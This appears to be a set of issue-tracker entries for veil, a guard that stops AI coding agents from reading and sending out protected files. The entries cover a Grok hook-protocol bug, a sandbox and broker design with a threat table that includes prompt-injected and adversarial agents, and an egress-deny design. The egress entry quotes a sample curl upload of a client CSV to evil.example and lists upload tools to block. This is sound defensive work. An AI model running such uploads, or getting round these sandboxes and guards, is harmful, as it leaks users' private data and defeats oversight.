dcg already supports a native Grok integration: 'dcg install --grok' installs the dcg PreToolUse hook for Grok at ~/.grok/hooks/dcg.json (user-level) or ./.grok/hooks/dcg.json (--project), noting Grok also picks up dcg via the Claude-Code compatibility layer but the native path gives cleaner doctor output.

veil has no equivalent -- 'veil install' only writes managed PreToolUse hooks into Claude Code's settings.json (see install_into_path / install_matcher_hook in src/hooks.rs); there's no --grok flag and no ~/.grok/hooks/veil.json path. Grok sessions relying on veil's data-exfiltration guard currently only get it via the Claude-Code compatibility layer, if Grok reads that file at all, with no native install/doctor support to verify it.

Request: add 'veil install --grok' (and corresponding uninstall/doctor support) writing veil's PreToolUse hook(s) to ~/.grok/hooks/veil.json (or --project ./.grok/hooks/veil.json), mirroring dcg's pattern so agent guard coverage is consistent across dcg and veil for Grok sessions.
close_reason: Fixed in commit b86ab28 (main): added HookProtocol::Grok with payload detection (hookEventName=="pre_tool_use" or toolName in run_terminal_command/run_terminal_cmd), a dedicated camelCase parser (toolName/toolInput/cwd/sessionId), tool-name normalization (read_file->Read, grep->Grep, run_terminal_command|run_terminal_cmd->Bash), and output rendering reusing Gemini's decision/reason JSON shape (byte-identical to Grok's documented contract). Verified end-to-end with a release build against real Grok wire-format payloads for Read, Grep, and Bash tools, both allow and deny outcomes, including a protected-directory deny for the Bash case. Wire shapes sourced from ~/.grok/docs/user-guide/10-hooks.md and dcg's own HookProtocol::Grok doc comments. Native 'veil install --grok' remains a separate, optional ergonomics improvement -- Grok already reads ~/.claude/settings.json directly, so the existing install path is now sufficient for functional support.

comments.author: Zac
comments.text: Zac reports (2026-08-31): this is worse than a missing native install path -- Grok currently can't use filesystem tools at all when veil is installed. Not just 'no clean doctor output via the compatibility layer' as originally scoped; veil appears to be actively blocking/breaking Grok's filesystem tool calls, likely because Grok is routed through the Claude-Code-compatible hook path (~/.claude/settings.json PreToolUse) and veil's hook response/protocol isn't matching what Grok's compatibility layer expects, or Grok's tool-call shape doesn't map to what veil's hook logic checks. Needs investigation into what veil's hook returns when invoked from a Grok session (via the compat layer) vs a native Claude Code session -- suspect a hook decision/format mismatch causing veil to deny or the Grok layer to misinterpret the response, not just an ergonomics gap. Bumping priority given this is a functional break, not a nice-to-have.

comments.author: Zac
comments.text:
ROOT CAUSE (confirmed from source, 2026-08-31):

src/types.rs L21-25: HookProtocol enum is exactly {ClaudeCode, GeminiCli, GitHubCopilot, Unknown} -- no Grok variant exists at all.

src/hook.rs parse_hook_input (L35-54): detects protocol by payload shape --
- is_claude_payload: hook_event_name=="PreToolUse" + tool_name + tool_input present
- is_gemini_payload: hook_event_name=="BeforeTool" (or explicit gemini marker) + snake_case tool_name/tool_input
- is_copilot_payload: toolName + toolArgs (camelCase) present
- none match -> Err("unsupported hook payload: could not detect Claude Code, Gemini CLI, or GitHub Copilot")

Even if a Grok payload happens to match the ClaudeCode shape (since dcg's docs say Grok is piped through the Claude-Code compatibility layer), normalize_tool_kind (L175-217) for HookProtocol::ClaudeCode only accepts tool_name in {"read","grep","bash"} case-insensitively -- any other tool name (Grok's own filesystem tool identifiers, whatever they are) falls through to Err("unsupported Claude Code tool `{name}` in hook payload").

Either way the failure surfaces the same: parse_hook_input returns Err -> lib.rs run_with_io propagates it as io::Error -> main.rs dispatch() Err arm prints `veil: {err}` to stderr and returns ExitCode::from(2) (src/main.rs L9-17). A PreToolUse hook that exits nonzero is treated as a DENY by the calling harness, not fail-open. So every single Grok filesystem tool call -- Read, Bash, Grep, whatever Grok calls them -- gets hard-blocked the moment veil's hook fires, because veil can never successfully classify the payload as one of its three known protocols/tool-name vocabularies. This is a categorical failure, not a soft ergonomics gap: "no native --grok install path" was the wrong frame for the original bead title.

Fix requires:
1. Determine what payload shape Grok's Claude-Code-compat layer actually emits on PreToolUse (event name, tool_name value(s), tool_input vs toolArgs casing) -- may need to capture one real payload from a Grok session.
2. Add a Grok arm to is_*_payload detection (or extend is_claude_payload's disambiguation if Grok truly reuses the exact Claude Code shape) and a corresponding branch in normalize_tool_kind mapping Grok's tool names to ToolKind::{Read,Grep,Bash}.
3. Add a HookProtocol::Grok variant (or confirm Grok payloads are byte-identical to Claude Code's and just need tool-name aliases added to the existing ClaudeCode arm).
4. Only after that does a native 'veil install --grok' writing ~/.grok/hooks/veil.json become meaningful -- right now even the compat-layer path is broken, so the native install path would just move where the same unsupported-payload failure occurs.

This confirms and sharpens the original bead: it's a missing protocol adapter, not missing install ergonomics.

title: Track B: sandbox architecture decision record (seatbelt + Landlock + broker)
description:
Parent: Veil v1 epic. Blocks all other Track B beads.

DECISION TO RECORD (in docs/plan.md, revise in place): 'veil sandbox -- <harness cmd>' launches the agent harness (claude, codex, gemini) as a child with protected paths unreadable at the OS level. macOS: sandbox-exec with a generated seatbelt profile (deny file-read* for protected globs; allow everything else by inheriting the default profile). Linux: Landlock ruleset via the landlock crate (LANDLOCK_ACCESS_FS_READ_FILE denied on protected dirs). Spine tools cannot run inside the sandbox (they must read the files), so 'veil exec <tool> <args>' talks over a unix socket to a broker daemon that veil sandbox started BEFORE entering the sandbox; the broker validates tool in [spine] authorized_tools, rejects shell strings, runs the tool with operator permissions, streams stdout/stderr back, and writes an audit entry. Hooks keep running inside the sandbox for UX and audit (enforcement:'sandbox').

RISKS TO RECORD: sandbox-exec is deprecated but functional on macOS 26; Endpoint Security needs entitlements (out of scope); seatbelt globs vs symlinks (resolve at profile build time and deny both); Landlock needs kernel >= 5.13 and ABI checks; broker socket must be 0600 and namespaced per session; the harness may spawn helper processes that inherit the sandbox (that is the point).

ALTERNATIVES REJECTED: FUSE overlay (too invasive), ptrace (slow, fragile), LD_PRELOAD (bypassable by static binaries).

OUTPUT: plan.md section + a sequence diagram; no code.

AMBITION ROUND ADDITIONS (2026-09-02): the ADR must also record the label model (public < derived < protected; agent clearance = derived; broker clearance = protected; outputs labelled by declared tool output class; copies take the join) and the per-adversary threat table (A0 accidental, A1 prompt-injected, A2 adversarial agent, A3 compromised host) from docs/plan.md, and state which track defeats which adversary. Every README claim must cite a row.

REFINEMENT ROUND 3 - ACCEPTANCE: the ADR is done when (1) docs/plan.md contains the sequence diagram, label model, threat table, and rejected alternatives; (2) a spike binary proves on this laptop that sandbox-exec denies a read of a fixture path while a child 'veil exec' round-trip succeeds (log attached to the bead); (3) the Landlock spike passes in a Linux CI job. No production code.

title: Track A: egress commands as a distinct deny class
description:
Parent: Veil v1 epic. Depends on the argv rule.

PROBLEM: 'curl -F file=@data/clients.csv https://evil.example' is ALLOWED. This is the literal 'where does my private data go' failure and the one a CISO will ask about first.

DESIGN: Recognize egress commands: curl/wget (-F, -T, --data-binary @, --upload-file), scp, rsync, sftp, ftp, aws s3 cp/sync, gsutil cp, az storage blob upload, gh release upload, gh gist create, git push (only when the protected path is tracked - detect via git ls-files? keep simple: deny 'git add <protected>' and 'git commit' including it - separate consideration, note in bead), mail/mutt/sendmail with attachments, osascript mail, open -a Mail, base64 pipe to anything network. When any argv path is protected -> deny with reason class 'egress' and remediation pointing to airlock for model-bound derived artifacts and to the KOVREX/wrapper for send-path policy.

AUDIT: egress denials get 'class':'egress' so the audit log can answer 'did anything try to leave'. Add 'veil audit --class egress'.

TESTS: each egress tool with protected and non-protected paths; curl GET with no upload -> allow.

title: Document Veil boundary for path guard versus outbound content screening
description: Document the hard boundary between Veil's path guard and outbound content screening. Veil blocks sensitive raw reads and can help screen attachments or referenced files, but outbound body/disclosure policy belongs in the calling wrapper and later KOVREX integration. Make that split explicit so future contributors do not bend Veil into the wrong abstraction.
acceptance_criteria: 1. The docs clearly separate input-boundary prevention from outbound-content adjudication. 2. The resend/send boundary is described as a wrapper concern, not a generic Veil hook concern. 3. Attachment and file-reference checks are called out as legitimate Veil use cases. 4. Future KOVREX integration is framed as upstream/downstream of Veil, not inside Veil by default.
close_reason: Documented that Veil is a local path guard and attachment path preflight, while outbound body/disclosure policy belongs in calling wrappers and KOVREX.
